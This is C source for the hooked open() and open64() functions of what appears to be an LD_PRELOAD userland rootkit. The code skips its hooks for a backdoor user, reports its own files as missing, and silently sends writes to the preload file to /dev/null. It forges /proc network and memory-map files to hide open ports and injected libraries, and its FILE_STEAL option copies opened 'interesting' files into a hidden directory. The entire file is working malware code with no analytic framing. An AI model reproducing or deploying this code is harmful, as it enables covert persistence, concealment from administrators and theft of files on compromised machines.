int open(const char *pathname, int flags, mode_t mode){
    hook(COPEN);
    if(is_bdusr()) return (long)call(COPEN, pathname, flags, mode);

#ifdef HIDE_SELF
    if(hidden_path(pathname) && strstr(LDSO_PRELOAD, pathname) &&
        ((process(SH_PROC) || process(BUSYBOX_PROC)) &&
        (flags == (64|1|512)))){
        int ret = (long)call(COPEN, DEVNULL_PATH, flags, mode);
        return ret;
    }
#endif

    if(hidden_path(pathname)){
        errno = ENOENT;
        return -1;
    }

    /*  if a process tries opening certain files, we return back an fd to our own file.
     *  essentially we mirror the pre-existing file while making sure we omit any
     *  sensitive information we may not want others seeing.
     *  we can apply this to any file that a process may need to open. */

#ifdef HIDE_PORTS
    if(!strncmp(TCP_PATH, pathname, strlen(pathname)) || !strncmp(TCP6_PATH, pathname, strlen(pathname)))
        return fileno(forge_procnet(pathname));
#endif

#ifdef FORGE_MAPS
    if(!fnmatch(MAPS_FULL_PATH, pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
    if(!fnmatch(SMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
    if(!fnmatch(NMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));

    char cwd[PATH_MAX];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(!strncmp(PROC_PATH, cwd, strlen(cwd))){
            if(!fnmatch(MAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch(SMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch(NMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }

        if(!fnmatch(PROC_ALL_PATH, cwd, FNM_PATHNAME)){
            if(!fnmatch(MAPS_FILENAME, pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch(SMAPS_FILENAME, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch(NMAPS_FILENAME, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }
    }
#endif

#ifdef FILE_STEAL
    /* we want to check if somebody is opening an 'interesting' file,
     * if they are, we want to essentially copy it to a hidden rootkit directory
     * for us to see. */
    inspect_file(pathname);
#endif
    return (long)call(COPEN, pathname, flags, mode);
}

int open64(const char *pathname, int flags, mode_t mode){
    hook(COPEN64);
    if(is_bdusr()) return (long)call(COPEN64, pathname, flags, mode);

#ifdef HIDE_SELF
    if(hidden_path(pathname) && strstr(LDSO_PRELOAD, pathname) &&
        ((process(SH_PROC) || process(BUSYBOX_PROC)) &&
        (flags == (64|1|512)))){
        int ret = (long)call(COPEN, DEVNULL_PATH, flags, mode);
        return ret;
    }
#endif

    if(hidden_path(pathname)){
        errno = ENOENT;
        return -1;
    }

#ifdef HIDE_PORTS
    if(!strncmp(TCP_PATH, pathname, strlen(pathname)) || !strncmp(TCP6_PATH, pathname, strlen(pathname)))
        return fileno(forge_procnet(pathname));
#endif

#ifdef FORGE_MAPS
    if(!fnmatch(MAPS_FULL_PATH, pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
    if(!fnmatch(SMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
    if(!fnmatch(NMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));

    char cwd[PATH_MAX];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(!strncmp(PROC_PATH, cwd, strlen(cwd))){
            if(!fnmatch(MAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch(SMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch(NMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }

        if(!fnmatch(PROC_ALL_PATH, cwd, FNM_PATHNAME)){
            if(!fnmatch(MAPS_FILENAME, pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch(SMAPS_FILENAME, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch(NMAPS_FILENAME, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }
    }
#endif

#ifdef FILE_STEAL
    inspect_file(pathname);
#endif
    return (long)call(COPEN64, pathname, flags, mode);
}
